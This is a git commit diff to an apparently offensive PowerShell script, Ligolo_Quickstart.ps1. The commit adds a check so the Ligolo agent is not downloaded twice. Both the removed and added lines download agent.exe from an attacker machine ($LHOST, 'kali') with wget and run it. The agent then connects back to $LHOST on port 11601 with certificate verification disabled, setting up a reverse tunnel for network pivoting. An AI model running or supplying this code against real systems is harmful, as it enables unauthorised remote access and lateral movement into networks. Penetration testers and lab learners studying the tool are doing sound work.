b64aa04acb2c41b16e895363ad2f4979327db633
OreoByte <45717578+OreoByte@users.noreply.github.com>
2023-09-13 20:39:40 -0700

    Update Ligolo_Quickstart.ps1
    add download check so it doesn't hang for a little bit of time on the second download again...

--- Ligolo_Quickstart.ps1
+++ Ligolo_Quickstart.ps1
@@ -12,7 +12,12 @@ function Invoke-Ligolo(){
 
 mkdir C:\Temp
 cd C:\Temp
-Read-Host -Prompt "Start web server on port 80 on kali, where agent.exe resides"
-wget -usebasicparsing http://$LHOST/agent.exe -o agent.exe
-.\agent.exe -connect $LHOST':11601' -ignore-cert
+if (Test-Path -Path ".\agent.exe" -PathType Leaf) {
+    Write-Host "File agent.exe is has already been downloading. Connecting with agent.exe"
+    .\agent.exe -connect $LHOST':11601' -ignore-cert
+} else {
+    Read-Host -Prompt "Start web server on port 80 on kali, where agent.exe resides"
+    wget -usebasicparsing http://$LHOST/agent.exe -o agent.exe
+    .\agent.exe -connect $LHOST':11601' -ignore-cert
+}
 }
